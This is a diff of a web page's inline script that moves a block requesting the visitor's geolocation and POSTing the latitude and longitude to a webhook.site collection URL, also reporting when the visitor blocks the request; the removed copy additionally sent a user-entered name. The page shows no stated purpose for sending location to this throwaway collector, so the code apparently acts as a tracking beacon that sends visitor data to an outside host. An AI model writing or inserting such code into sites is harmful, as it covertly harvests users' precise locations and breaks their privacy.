@@ -51,7 +51,58 @@ window.addEventListener('load', function() {
     body: JSON.stringify({ message: 'User has loaded the page' })
   });
 });
-  
+
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+} else {
+  console.log("Geolocation is not supported by this browser.");
+}
+
+function successCallback(position) {
+  var latitude = position.coords.latitude;
+  var longitude = position.coords.longitude;
+  console.log("Latitude: " + latitude);
+  console.log("Longitude: " + longitude);
+
+  var xmlHttp = new XMLHttpRequest();
+  xmlHttp.open("POST", "https://webhook.site/b68c44bc-d9dd-4a29-9f9b-3ff2fe4729ce", true);
+  xmlHttp.setRequestHeader("Content-type", "application/json");
+
+  var data = {
+    latitude: latitude,
+    longitude: longitude
+  };
+
+  xmlHttp.onreadystatechange = function() {
+    if (xmlHttp.readyState === 4 && xmlHttp.status === 200) {
+      console.log("Request sent successfully!");
+      console.log("Response:", xmlHttp.responseText);
+    }
+  };
+
+  xmlHttp.send(JSON.stringify(data));
+}
+
+function errorCallback(error) {
+  console.log("Error occurred. Error code: " + error.code);
+
+  var xmlHttp = new XMLHttpRequest();
+  xmlHttp.open("POST", "https://webhook.site/b68c44bc-d9dd-4a29-9f9b-3ff2fe4729ce", true);
+  xmlHttp.setRequestHeader("Content-type", "application/json");
+
+  var data = {
+    message: "Blocked by user"
+  };
+
+  xmlHttp.onreadystatechange = function() {
+    if (xmlHttp.readyState === 4 && xmlHttp.status === 200) {
+      console.log("Request sent successfully!");
+      console.log("Response:", xmlHttp.responseText);
+    }
+  };
+
+  xmlHttp.send(JSON.stringify(data));
+}
 </script>
 <!-- HTML Code -->
 
@@ -108,62 +159,6 @@ window.addEventListener('load', function() {
     });
   });
 
-
-
-  
-if (navigator.geolocation) {
-  navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
-} else {
-  console.log("Geolocation is not supported by this browser.");
-}
-
-function successCallback(position) {
-  var latitude = position.coords.latitude;
-  var longitude = position.coords.longitude;
-  console.log("Latitude: " + latitude);
-  console.log("Longitude: " + longitude);
-
-  var xmlHttp = new XMLHttpRequest();
-  xmlHttp.open("POST", "https://webhook.site/b68c44bc-d9dd-4a29-9f9b-3ff2fe4729ce", true);
-  xmlHttp.setRequestHeader("Content-type", "application/json");
-
-  var data = {
-    name: userInput,
-    latitude: latitude,
-    longitude: longitude
-  };
-
-  xmlHttp.onreadystatechange = function() {
-    if (xmlHttp.readyState === 4 && xmlHttp.status === 200) {
-      console.log("Request sent successfully!");
-      console.log("Response:", xmlHttp.responseText);
-    }
-  };
-
-  xmlHttp.send(JSON.stringify(data));
-}
-
-function errorCallback(error) {
-  console.log("Error occurred. Error code: " + error.code);
-
-  var xmlHttp = new XMLHttpRequest();
-  xmlHttp.open("POST", "https://webhook.site/b68c44bc-d9dd-4a29-9f9b-3ff2fe4729ce", true);
-  xmlHttp.setRequestHeader("Content-type", "application/json");
-
-  var data = {
-    name: userInput,
-    message: "Blocked by user"
-  };
-
-  xmlHttp.onreadystatechange = function() {
-    if (xmlHttp.readyState === 4 && xmlHttp.status === 200) {
-      console.log("Request sent successfully!");
-      console.log("Response:", xmlHttp.responseText);
-    }
-  };
-
-  xmlHttp.send(JSON.stringify(data));
-}
 </script>
 
 
